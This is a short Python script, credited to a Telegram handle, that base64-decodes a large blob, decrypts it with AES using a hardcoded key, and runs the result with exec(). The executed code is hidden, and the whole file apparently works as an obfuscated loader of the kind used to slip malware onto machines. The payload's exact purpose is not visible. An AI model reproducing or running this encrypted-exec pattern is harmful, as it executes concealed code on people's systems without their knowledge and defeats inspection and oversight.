# Telegram: @rafi_broh


import base64
from Crypto.Cipher import AES


def decrypt_data(data, key):
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)


encrypted_data = base64.b64decode("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")


aes_key = b'\xba\xd5\xff\xfeX\xe4\xfcR\xf5\x10k\x19\x9c\xa6$\x9e'


exec(decrypt_data(encrypted_data, aes_key))
